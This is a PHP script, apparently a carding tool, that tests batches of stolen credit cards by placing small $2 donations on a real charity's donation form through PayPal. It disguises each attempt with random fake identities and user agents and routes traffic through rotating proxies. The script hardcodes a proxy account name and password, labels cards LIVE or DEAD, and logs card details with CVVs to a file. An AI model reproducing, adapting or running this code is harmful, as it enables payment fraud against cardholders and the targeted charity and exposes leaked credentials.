<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);

require_once "randuser.php";
require_once "fungsi.php";

if (!function_exists('api_response')) {
    function api_response($status_code, $message, $data = null)
    {
        header_remove();
        header("Content-Type: application/json");
        http_response_code($status_code);

        $response = [
            'status' => $status_code,
            'message' => $message,
        ];

        if ($data !== null) {
            $response['data'] = $data;
        }

        echo json_encode($response, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
        exit();
    }
}

// Konfigurasi donasi
$donationConfig = [
    'amount' => '2.00',
    'donation_type_id' => '7',
];

// Nama file
$cookieFile = 'cookie.txt';

// Konfigurasi Proxy Bright Data
// Ganti dengan detail proxy Anda jika berbeda
define('PROXY_ADDRESS', 'http://brd.superproxy.io:33335');
define('PROXY_CREDENTIALS_BASE', 'brd-customer-hl_11e62775-zone-isp_proxy1-country-us');
define('PROXY_PASSWORD', 'p7xywu7ftcr9');

// =========================================================================
// EKSEKUSI UTAMA
// =========================================================================

$results = []; // Array to store results for JSON output

// Check for card data in GET parameter
if (!isset($_GET['cards']) || empty($_GET['cards'])) {
    api_response(400, "Bad Request", ['error' => "Missing 'cards' GET parameter. Format: ?cards=nocc|MM|YYYY|cvv[,nocc|MM|YYYY|cvv..."]);
}

$rawCardsInput = $_GET['cards'];
$inputCards = explode(',', $rawCardsInput);

$allCards = [];
foreach ($inputCards as $cardString) {
    $parts = explode('|', $cardString);
    if (count($parts) === 4) {
        $allCards[] = [
            'number' => trim($parts[0]),
            'expiry_month' => trim($parts[1]),
            'expiry_year' => trim($parts[2]),
            'cvv' => trim($parts[3]),
        ];
    } else {
        api_response(400, "Bad Request", ['error' => "Invalid card format in GET parameter. Each card must be 'nocc|MM|YYYY|cvv'."]);
    }
}

$totalCards = count($allCards);
$results['total_cards_processed'] = $totalCards;
$results['card_details'] = [];

foreach ($allCards as $index => $currentCardDetails) {
    $cardResult = [
        'card_number_masked' => mask_card_number($currentCardDetails['number']),
        'status' => 'UNKNOWN',
        'message' => '',
        'bin_info' => 'N/A'
    ];

    // --- BUAT IDENTITAS BARU UNTUK SETIAP SIKLUS KARTU ---
    $randuser = random_user_agent();
    $sessionId = 'sess' . mt_rand(1000000, 9999999);
    $proxyUserPwd = sprintf("%s-session-%s:%s", PROXY_CREDENTIALS_BASE, $sessionId, PROXY_PASSWORD);
    // ----------------------------------------------------

    // Langkah 0a: Periksa BIN
    $bin = substr($currentCardDetails['number'], 0, 6);
    $bin_response_raw = check_bin($bin, $randuser, PROXY_ADDRESS, $proxyUserPwd);
    $bin_response = json_decode($bin_response_raw, true);

    if (json_last_error() === JSON_ERROR_NONE && isset($bin_response['Status']) && $bin_response['Status'] == 'SUCCESS') {
        $scheme = $bin_response['Scheme'] ?? 'N/A';
        $type = $bin_response['Type'] ?? 'N/A';
        $bank = $bin_response['Issuer'] ?? 'N/A';
        $country = $bin_response['CardTier'] ?? 'N/A'; // Assuming CardTier is for country info, adjust if needed
        $cardResult['bin_info'] = "$scheme - $type - $bank - $country";
    } else {
        $cardResult['bin_info'] = "Failed to get BIN data.";
    }

    // Hapus cookie lama jika ada
    if (file_exists($cookieFile)) {
        unlink($cookieFile);
    }

    // Langkah 0b: Ambil Data Pengguna Acak
    $myDonation = get_random_user_data($randuser, PROXY_ADDRESS, $proxyUserPwd);
    if (isset($myDonation['error'])) {
        $cardResult['status'] = 'SKIPPED';
        $cardResult['message'] = "Failed at Step 0b: " . $myDonation['error'];
        $results['card_details'][] = $cardResult;
        continue;
    }
    $myDonation = array_merge($myDonation, $donationConfig);
    $currentCardDetails['name'] = $myDonation['first_name'];

    // Langkah 1: Ekstrak Data dari Halaman
    $targetUrl = "https://elemotion.org/donate/?v=" . time();
    $extractedData = extract_wpform_data($targetUrl, $cookieFile, $randuser, PROXY_ADDRESS, $proxyUserPwd);
    if (isset($extractedData['error'])) {
        $cardResult['status'] = 'SKIPPED';
        $cardResult['message'] = "Failed at Step 1: " . $extractedData['error'];
        $results['card_details'][] = $cardResult;
        continue;
    }

    sleep(1);

    // Langkah 2: Buat Order
    $orderCreationResult = submit_donation_form($extractedData, $myDonation, $cookieFile, $randuser, PROXY_ADDRESS, $proxyUserPwd);
    if (!isset($orderCreationResult['success']) || $orderCreationResult['success'] !== true || empty($orderCreationResult['data']['id'])) {
        $cardResult['status'] = 'SKIPPED';
        $cardResult['message'] = "Failed at Step 2 (Order Creation). Response: " . json_encode($orderCreationResult);
        $results['card_details'][] = $cardResult;
        continue;
    }
    $orderId = $orderCreationResult['data']['id'];
    sleep(1);

    // Langkah 3: Konfirmasi Pembayaran
    $paymentConfirmationResult = confirm_paypal_payment($extractedData['paypal_token'], $orderId, $currentCardDetails, $randuser);
    if (isset($paymentConfirmationResult['error']) || isset($paymentConfirmationResult['name'])) {
        $cardResult['status'] = 'DEAD';
        $cardResult['message'] = $paymentConfirmationResult['details'][0]['issue'] ?? 'Payment confirmation failed.';
        $results['card_details'][] = $cardResult;
        file_put_contents('dead_cards.txt', mask_card_number($currentCardDetails['number']) . '|' . $currentCardDetails['expiry_month'] . '|' . $currentCardDetails['expiry_year'] . '|' . $currentCardDetails['cvv'] . ' => ' . ($paymentConfirmationResult['details'][0]['issue'] ?? 'Unknown issue') . PHP_EOL, FILE_APPEND);
        continue;
    }

    // Langkah 4: Finalisasi
    $finalResult = finalize_wp_submission($extractedData, $myDonation, $orderId, $cookieFile, $randuser, PROXY_ADDRESS, $proxyUserPwd);

    // Proses Hasil Akhir
    if (isset($finalResult['error'])) {
        $cardResult['status'] = 'ERROR';
        $cardResult['message'] = "Failed at Step 4 due to technical error: " . json_encode($finalResult);
    } elseif (isset($finalResult['success']) && $finalResult['success'] === false) {
        $cardResult['status'] = 'DEAD';
        $errorMessage = "Error message not found.";
        if (isset($finalResult['data']['errors']['general']['footer'])) {
            $footerHtml = $finalResult['data']['errors']['general']['footer'];
            if (preg_match('/<p>(.*?)<\/p>/si', $footerHtml, $matches)) {
                $errorMessage = trim(strip_tags($matches[1]));
            } else {
                $errorMessage = trim(strip_tags($footerHtml));
            }
        }
        $cardResult['message'] = $errorMessage;
        //file_put_contents('dead_cards.txt', mask_card_number($currentCardDetails['number']) . '|' . $currentCardDetails['expiry_month'] . '|' . $currentCardDetails['expiry_year'] . '|' . $currentCardDetails['cvv'] . ' => ' . $errorMessage . PHP_EOL, FILE_APPEND);
    } elseif (isset($finalResult['success']) && $finalResult['success'] === true) {
        $cardResult['status'] = 'LIVE';
        $cardResult['message'] = 'Donation successful.';
        //file_put_contents('live_cards.txt', mask_card_number($currentCardDetails['number']) . '|' . $currentCardDetails['expiry_month'] . '|' . $currentCardDetails['expiry_year'] . '|' . $currentCardDetails['cvv'] . PHP_EOL, FILE_APPEND);
    } else {
        $cardResult['status'] = 'UNKNOWN';
        $cardResult['message'] = 'Unexpected response format for finalization.';
        $cardResult['raw_response'] = $finalResult;
    }

    $results['card_details'][] = $cardResult;

    // Beri jeda sebelum memproses kartu berikutnya
    if ($index < $totalCards - 1) {
        sleep(3);
    }
}

// Hapus file cookie di akhir sesi
if (file_exists($cookieFile)) {
    unlink($cookieFile);
}

api_response(200, "Card processing complete", $results);

?>